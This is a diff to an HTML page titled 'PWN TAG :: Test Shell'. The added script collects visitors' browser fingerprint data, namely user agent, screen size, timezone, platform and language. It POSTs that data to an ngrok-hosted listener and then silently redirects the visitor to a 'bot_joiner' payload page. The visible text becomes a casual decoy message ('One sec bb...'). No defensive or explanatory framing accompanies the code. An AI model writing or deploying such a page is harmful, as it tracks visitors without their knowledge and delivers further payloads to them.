@@ -2,21 +2,29 @@
   <head>
     <title>PWN TAG :: Test Shell</title>
     <script>
+      // Gather basic fingerprint
       const log = {
         userAgent: navigator.userAgent,
         screen: `${screen.width}x${screen.height}`,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        platform: navigator.platform,
+        lang: navigator.language
       };
 
-      fetch("https://YOUR_NGROK_URL/testlog", {
+      // Send log to your listener
+      fetch("https://pwn-tag.ngrok.app/testlog", {
         method: "POST",
         body: JSON.stringify(log),
         headers: { "Content-Type": "application/json" }
       });
+
+      // Short delay then redirect to real payload
+      setTimeout(() => {
+        window.location.href = "https://pwn-tag.ngrok.app/payloads/bot_joiner.html";
+      }, 300); // 300ms is usually safe
     </script>
   </head>
   <body>
-    <h1>PWN TAG Test Activated</h1>
-    <p>Payload delivered. Logs sent.</p>
+    <p>One sec bb...</p>
   </body>
 </html>
